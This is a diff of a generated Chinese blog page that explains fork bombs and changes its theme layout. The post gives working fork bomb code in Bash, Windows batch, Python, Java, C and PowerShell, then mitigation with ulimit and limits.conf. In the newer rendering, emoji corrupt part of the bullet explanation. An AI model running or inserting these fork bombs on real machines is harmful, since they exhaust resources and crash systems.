@@ -14,7 +14,7 @@
   
 
 
-<html class="theme-next gemini use-motion" lang="zh-Hans">
+<html class="theme-next muse use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -100,9 +100,9 @@
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Gemini',
+    scheme: 'Muse',
     version: '7.2.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":true},
+    sidebar: {"position":"right","display":"hide","offset":12,"onmobile":true},
     back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
     copycode: {"enable":true,"show_result":true,"style":"mac"},
     fancybox: true,
@@ -206,7 +206,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-right page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -339,6 +339,9 @@
   
 
   
+    
+
+  
 
   
     <div class="site-search">
@@ -375,9 +378,6 @@
     <main id="main" class="main">
       <div class="main-inner">
         <div class="content-wrap">
-          
-            
-
           
           <div id="content" class="content">
             
@@ -532,37 +532,36 @@
       
         <p><strong>Fork bomb</strong> 是一种拒绝服务攻击，无限 <strong>fork</strong> 子进程以耗尽可用系统资源(CPU占用率高达100%)，由于资源匮乏而导致系统速度放慢或崩溃。</p>
 <a id="more"></a>
-
-<h3 id="Linux-Bash"><a href="#Linux-Bash" class="headerlink" title="Linux Bash"></a>Linux Bash</h3><p>一个最简单的例子 (请在虚拟机上执行！)</p>
+<h3 id="linux-bash"><a class="markdownIt-Anchor" href="#linux-bash"></a> Linux Bash</h3>
+<p>一个最简单的例子 (请在虚拟机上执行！)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ :()&#123; :|:&amp; &#125;;:</span><br></pre></td></tr></table></figure>
-
 <ul>
-<li>:() 定义一个名为 <strong>:</strong> 的函数</li>
+<li>😦) 定义一个名为 <strong>:</strong> 的函数</li>
 <li>{ … } 函数体</li>
-<li>:|: 递归调用该命令</li>
+<li>😐: 递归调用该命令</li>
 <li>&amp; 后台运行，前台运行直接为 <strong>;</strong></li>
 <li>; 分割符</li>
 <li>: 执行名为 <strong>:</strong> 的函数</li>
 </ul>
 <p>执行该命令会创建一个子进程，然后在无限循环中重复自己，不断产生进程，结果是一个无法响应的系统(死机)。</p>
-<h3 id="Windows-Batch"><a href="#Windows-Batch" class="headerlink" title="Windows Batch"></a>Windows Batch</h3><p>Windows 批处理同样也可以发生fork bomb。新建一个.bat批处理文件，并添加一下简短的内容</p>
+<h3 id="windows-batch"><a class="markdownIt-Anchor" href="#windows-batch"></a> Windows Batch</h3>
+<p>Windows 批处理同样也可以发生fork bomb。新建一个.bat批处理文件，并添加一下简短的内容</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">0 | %0</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	os.fork()</span><br></pre></td></tr></table></figure>
-
-<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForkBomb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"javaw"</span>, <span class="string">"-cp"</span>, System.getProperty(<span class="string">"java.class.path"</span>), <span class="string">"ForkBomb"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      fork();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>) &#123; </span><br><span class="line">    <span class="built_in">Start-Process</span> powershell.exe <span class="literal">-ArgumentList</span> <span class="string">"-NoExit"</span>, <span class="string">"Get-ChildItem -Recurse C:"</span>;</span><br><span class="line">    <span class="built_in">Invoke-Expression</span> <span class="literal">-Command</span> <span class="string">'while($true) &#123;Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"&#125;'</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="避免"><a href="#避免" class="headerlink" title="避免"></a>避免</h3><p>在Linux下，可以通过 <strong>ulimit</strong> 设置的最大进程数(max user processes)</p>
+<h3 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	os.fork()</span><br></pre></td></tr></table></figure>
+<h3 id="java"><a class="markdownIt-Anchor" href="#java"></a> Java</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForkBomb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"javaw"</span>, <span class="string">"-cp"</span>, System.getProperty(<span class="string">"java.class.path"</span>), <span class="string">"ForkBomb"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="c"><a class="markdownIt-Anchor" href="#c"></a> C</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      fork();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="powershell"><a class="markdownIt-Anchor" href="#powershell"></a> PowerShell</h3>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>) &#123; </span><br><span class="line">    <span class="built_in">Start-Process</span> powershell.exe <span class="literal">-ArgumentList</span> <span class="string">"-NoExit"</span>, <span class="string">"Get-ChildItem -Recurse C:"</span>;</span><br><span class="line">    <span class="built_in">Invoke-Expression</span> <span class="literal">-Command</span> <span class="string">'while($true) &#123;Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"&#125;'</span>;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="避免"><a class="markdownIt-Anchor" href="#避免"></a> 避免</h3>
+<p>在Linux下，可以通过 <strong>ulimit</strong> 设置的最大进程数(max user processes)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ulimit -a</span><br><span class="line">core file size          (blocks, -c) 0</span><br><span class="line">data seg size           (kbytes, -d) unlimited</span><br><span class="line">scheduling priority             (-e) 0</span><br><span class="line">file size               (blocks, -f) unlimited</span><br><span class="line">pending signals                 (-i) 30195</span><br><span class="line">max locked memory       (kbytes, -l) 16384</span><br><span class="line">max memory size         (kbytes, -m) unlimited</span><br><span class="line">open files                      (-n) 1024</span><br><span class="line">pipe size            (512 bytes, -p) 8</span><br><span class="line">POSIX message queues     (bytes, -q) 819200</span><br><span class="line">real-time priority              (-r) 0</span><br><span class="line">stack size              (kbytes, -s) 8192</span><br><span class="line">cpu time               (seconds, -t) unlimited</span><br><span class="line">max user processes              (-u) 30195</span><br><span class="line">virtual memory          (kbytes, -v) unlimited</span><br><span class="line">file locks                      (-x) unlimited</span><br></pre></td></tr></table></figure>
-
 <p>但是这只能在当前终端生效。因此，还可以修改 <strong>/etc/security/limits.conf</strong> 配置文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#&lt;domain&gt;        &lt;type&gt;  &lt;item&gt;  &lt;value&gt;</span><br><span class="line">*               soft    nproc            4096</span><br></pre></td></tr></table></figure>
-
-<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>参考资料</p>
+<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
+<p>参考资料</p>
 <ul>
 <li><a href="https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html" target="_blank" rel="noopener">https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html</a></li>
 <li><a href="https://en.wikipedia.org/wiki/Fork_bomb" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Fork_bomb</a></li>
@@ -720,7 +719,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-count">67</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -826,9 +825,7 @@
         
           
         
-          
-        
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">29</span>
         <span class="site-state-item-name">标签</span>
         </a>
       </div>
@@ -896,7 +893,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-Bash"><span class="nav-number">1.</span> <span class="nav-text">Linux Bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-Batch"><span class="nav-number">2.</span> <span class="nav-text">Windows Batch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python"><span class="nav-number">3.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java"><span class="nav-number">4.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C"><span class="nav-number">5.</span> <span class="nav-text">C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PowerShell"><span class="nav-number">6.</span> <span class="nav-text">PowerShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#避免"><span class="nav-number">7.</span> <span class="nav-text">避免</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结尾"><span class="nav-number">8.</span> <span class="nav-text">结尾</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-bash"><span class="nav-number">1.</span> <span class="nav-text"> Linux Bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-batch"><span class="nav-number">2.</span> <span class="nav-text"> Windows Batch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python"><span class="nav-number">3.</span> <span class="nav-text"> Python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java"><span class="nav-number">4.</span> <span class="nav-text"> Java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#c"><span class="nav-number">5.</span> <span class="nav-text"> C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell"><span class="nav-number">6.</span> <span class="nav-text"> PowerShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#避免"><span class="nav-number">7.</span> <span class="nav-text"> 避免</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结尾"><span class="nav-number">8.</span> <span class="nav-text"> 结尾</span></a></li></ol></div>
             
 
           </div>
@@ -929,7 +926,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">302k</span>
+    <span title="站点总字数">303k</span>
   
 
   
@@ -1036,10 +1033,7 @@
   
 
 
-  <script src="/js/affix.js?v=7.2.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
-
+  <script src="/js/schemes/muse.js?v=7.2.0"></script>
 
 
 
